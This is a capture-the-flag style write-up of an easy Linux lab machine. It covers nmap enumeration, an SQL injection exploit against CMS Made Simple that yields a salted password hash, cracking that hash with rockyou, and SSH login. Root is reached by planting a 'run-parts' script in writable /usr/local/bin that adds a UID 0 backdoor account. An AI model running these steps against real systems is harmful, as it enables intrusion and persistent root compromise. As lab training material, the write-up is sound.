

## Lab Details
- Difficulty: Easy
- OS: Linux

## Summary
- Initial access: Web
- Privilege escalation: Excessive permission over user

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.174.60 -p22,80 -Pn -sC -sV -A  -T5
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-29 00:09 -0700
Nmap scan report for 10.129.174.60
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey:
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/writeup/
|_http-title: Nothing here yet.
```
## Foothold

#### Steps
- Inspect the page source at `http://10.129.173.69/writeup` and found the web app is running with `CMS Made Simple`
```
<!doctype html>
<html lang="en_US"><head>
	<title>ypuffy - writeup</title>
	
<base href="http://10.129.173.69/writeup/" />
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
```
- Search online and found exploit for SQLi
```
https://www.exploit-db.com/exploits/46635
```
- Run the exploit against target
```
$ python2 exploit.py -u http://10.129.173.69/writeup/
```
- Obtained the hashed password
```
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```
- Run the exploit again to obtain the plaintext password
```
$ python2 exploit.py  -u http://10.129.173.69/writeup/ --crack -w /usr/share/wordlists/rockyou.txt
```

```
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9
```
- Attempt to login via SSH with obtained credential and able to login as user `jkr`
```
## password: raykayjay9
ssh jkr@10.129.173.69 
```

## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps

- Run `linpeas.sh` and found that the user is able to modify before directories due to the groups the user is in `staff`
```
/usr/local/sbin:/usr/local/bin
```
- The staff group is able to write to the directories in `/usr/local`
```
jkr@writeup:/usr/local$ ls -la 
total 64
drwxrwsr-x 10 root staff  4096 Apr 19  2019 .
drwxr-xr-x 10 root root   4096 Apr 19  2019 ..
drwx-wsr-x  2 root staff 20480 May 30 23:21 bin
drwxrwsr-x  2 root staff  4096 Apr 19  2019 etc
drwxrwsr-x  2 root staff  4096 Apr 19  2019 games
drwxrwsr-x  2 root staff  4096 Apr 19  2019 include
drwxrwsr-x  4 root staff  4096 Apr 24  2019 lib
lrwxrwxrwx  1 root staff     9 Apr 19  2019 man -> share/man
drwx-wsr-x  2 root staff 12288 May 30 23:08 sbin
drwxrwsr-x  8 root staff  4096 Aug  6  2021 share
drwxrwsr-x  2 root staff  4096 Apr 19  2019 src
```
- Run [pspy](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1) and we found that everytime when we login via ssh below commands runs
```
jkr@writeup:~$ ./pspy64 -p -i 1000
<SNIP>
2026/05/30 23:19:35 CMD: UID=0     PID=2190   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2026/05/30 23:19:35 CMD: UID=0     PID=2191   | /bin/bash /usr/local/bin/run-parts --lsbsysinit /etc/update-motd.d 
<SNIP>
```
- Since we have modify permission over `/usr/local/sbin:/usr/local/bin` we can create a malicious command as `run-parts` in the `/usr/local/bin` directory
- Below is command to add a new root user 
```
jkr@writeup:/usr/local/bin$ vi ./run-parts
jkr@writeup:/usr/local/bin$ chmod +x ./run-parts
jkr@writeup:/usr/local/bin$ cat ./run-parts
#!/bin/bash
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash newroot 2>/dev/null; echo 'newroot:password123!' | chpasswd
```
- SSH into target again and check `/etc/passwd` found the newroot user has been appended to the file
```
jkr@writeup:~$ cat /etc/passwd
<SNIP>
newroot:x:0:0::/root:/bin/bash
```
- Login and we are root user
```
jkr@writeup:~$ su - newroot
Password: 
root@writeup:~# pwd
/root
```
## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: